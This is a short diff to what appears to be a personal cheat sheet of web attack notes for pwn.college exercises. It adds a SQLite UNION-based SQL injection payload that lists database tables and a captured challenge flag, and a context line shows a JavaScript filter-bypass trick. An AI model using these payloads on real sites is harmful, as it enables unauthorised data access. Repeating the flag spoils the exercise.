@@ -33,6 +33,12 @@ If error:
 - Try adding a limit to the amount of Rows
 - Try adding more columns
 
+### sqlite3:
+get tables:
+```sql
+' UNION SELECT name, type FROM sqlite_master WHERE type='table'--
+```
+pwn.college{0z9pflHec7Z--_UnAMj7p6qmMMV.dNzN1YDLyQTM5QzW}
 #### If () are blocked:  
 ```javascript
  `${console.log`test`}`
